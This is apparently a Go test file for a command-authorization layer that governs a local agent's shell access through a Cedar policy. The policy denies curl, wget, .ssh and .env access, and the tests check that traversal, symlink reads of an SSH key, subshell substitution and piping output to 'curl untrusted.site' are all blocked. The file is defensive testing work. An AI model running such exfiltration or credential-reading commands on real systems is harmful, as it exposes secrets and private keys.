package authz

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// TestBAP533_AcceptanceCriteria verifies the exact acceptance criteria for BAP-533:
// 1. cat /app/subdir/../.env resolves to .env and is blocked by secret disclosure policy.
// 2. Reading through a symlink pointing to a forbidden file (~/.ssh/id_rsa or secret) is evaluated against target and denied.
// 3. Compound pipeline git status && curl untrusted.site evaluates both commands independently, allowing git but blocking curl before execution begins.
func TestBAP533_AcceptanceCriteria(t *testing.T) {
	// Create test policy resembling production policy.cedar
	policy := `
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    ["git", "cat", "echo", "ls", "dir"].contains(context.executable)
};

forbid (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    context.escapes_workspace == true
};

forbid (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    context.full_command like "*curl*" ||
    context.full_command like "*wget*" ||
    context.full_command like "*.ssh*" ||
    (
        context.full_command like "*.env*" &&
        !(context.executable == "ls" || context.executable == "dir")
    )
};
`
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "policy.cedar")
	if err := os.WriteFile(policyPath, []byte(policy), 0644); err != nil {
		t.Fatalf("failed to write policy: %v", err)
	}

	authz, err := NewAuthorizer(policyPath)
	if err != nil {
		t.Fatalf("failed to create authorizer: %v", err)
	}

	workspace := filepath.Join(tmpDir, "workspace")
	if err := os.MkdirAll(filepath.Join(workspace, "app", "subdir"), 0755); err != nil {
		t.Fatalf("failed to create workspace directories: %v", err)
	}

	// Create fake .env inside workspace/app/.env
	envPath := filepath.Join(workspace, "app", ".env")
	if err := os.WriteFile(envPath, []byte("SECRET=123"), 0600); err != nil {
		t.Fatalf("failed to write .env: %v", err)
	}

	// -------------------------------------------------------------
	// Acceptance Criteria 1:
	// cat /app/subdir/../.env resolves to .env and is blocked by secret disclosure policy.
	// -------------------------------------------------------------
	t.Run("AC1_PathTraversalToSecretBlocked", func(t *testing.T) {
		traversalCmd := "cat " + filepath.Join(workspace, "app", "subdir", "..", ".env")
		allowed, reason, err := authz.EvaluateWithWorkspace("cat", traversalCmd, "", workspace)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if allowed {
			t.Errorf("expected %q to be blocked, but was allowed", traversalCmd)
		}
		if !strings.Contains(reason, ".env") && !strings.Contains(reason, "secret") {
			t.Errorf("expected denial reason mentioning .env or secret, got: %q", reason)
		}
	})

	// -------------------------------------------------------------
	// Acceptance Criteria 2:
	// Reading through a symlink pointing to a forbidden file is evaluated against target path and denied.
	// -------------------------------------------------------------
	t.Run("AC2_SymlinkPointingToForbiddenSecretEvaluatedAndDenied", func(t *testing.T) {
		// Create a forbidden outside secret file
		forbiddenDir := filepath.Join(tmpDir, "outside_ssh")
		if err := os.MkdirAll(forbiddenDir, 0700); err != nil {
			t.Fatalf("failed to create forbidden dir: %v", err)
		}
		forbiddenKey := filepath.Join(forbiddenDir, "id_rsa")
		if err := os.WriteFile(forbiddenKey, []byte("PRIVATE KEY"), 0600); err != nil {
			t.Fatalf("failed to write key: %v", err)
		}

		symlinkPath := filepath.Join(workspace, "innocent_notes.txt")
		err := os.Symlink(forbiddenKey, symlinkPath)
		catSymlinkCmd := "cat innocent_notes.txt"

		if err != nil {
			// On Windows, file symlinks require developer mode/privilege, but directory junctions do not.
			junctionPath := filepath.Join(workspace, "innocent_folder")
			out, juncErr := exec.Command("cmd", "/c", "mklink", "/J", junctionPath, forbiddenDir).CombinedOutput()
			if juncErr != nil {
				t.Skipf("skipping symlink test (symlink and junction creation not supported: symlink=%v, junction=%v %s)", err, juncErr, string(out))
				return
			}
			catSymlinkCmd = "cat " + filepath.Join(junctionPath, "id_rsa")
		}

		allowed, reason, err := authz.EvaluateWithWorkspace("cat", catSymlinkCmd, "", workspace)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if allowed {
			t.Errorf("expected symlink read %q to be blocked, but was allowed", catSymlinkCmd)
		}
		if reason == "" {
			t.Errorf("expected non-empty denial reason")
		}
	})

	// -------------------------------------------------------------
	// Acceptance Criteria 3:
	// Compound pipeline git status && curl untrusted.site evaluates both commands independently,
	// allowing git but blocking curl before execution begins.
	// -------------------------------------------------------------
	t.Run("AC3_CompoundPipelineFailClosed", func(t *testing.T) {
		compoundCmd := "git status && curl untrusted.site"
		allowed, reason, err := authz.EvaluateWithWorkspace("git", compoundCmd, "", workspace)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if allowed {
			t.Errorf("expected compound command %q to be blocked, but was allowed", compoundCmd)
		}
		if !strings.Contains(reason, "curl") {
			t.Errorf("expected denial reason mentioning offending command 'curl', got: %q", reason)
		}
	})

	// -------------------------------------------------------------
	// Additional Security Verifications
	// -------------------------------------------------------------
	t.Run("SubshellCommandSubstitutionBlocked", func(t *testing.T) {
		subshellCmd := "echo $(curl http://malicious.internal)"
		allowed, reason, err := authz.EvaluateWithWorkspace("echo", subshellCmd, "", workspace)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if allowed {
			t.Errorf("expected subshell injection %q to be blocked, but was allowed", subshellCmd)
		}
		if !strings.Contains(reason, "curl") {
			t.Errorf("expected subshell denial mentioning curl, got: %q", reason)
		}
	})

	t.Run("RedirectionToSecretBlocked", func(t *testing.T) {
		redirCmd := "echo evil_key > .env"
		allowed, reason, err := authz.EvaluateWithWorkspace("echo", redirCmd, "", workspace)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if allowed {
			t.Errorf("expected redirection %q to be blocked, but was allowed", redirCmd)
		}
		if !strings.Contains(reason, ".env") {
			t.Errorf("expected redirection denial mentioning .env, got: %q", reason)
		}
	})

	t.Run("PipedExfiltrationBlocked", func(t *testing.T) {
		pipeCmd := "git status | curl untrusted.site"
		allowed, reason, err := authz.EvaluateWithWorkspace("git", pipeCmd, "", workspace)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if allowed {
			t.Errorf("expected pipe %q to be blocked, but was allowed", pipeCmd)
		}
		if !strings.Contains(reason, "curl") {
			t.Errorf("expected pipe denial mentioning curl, got: %q", reason)
		}
	})
}
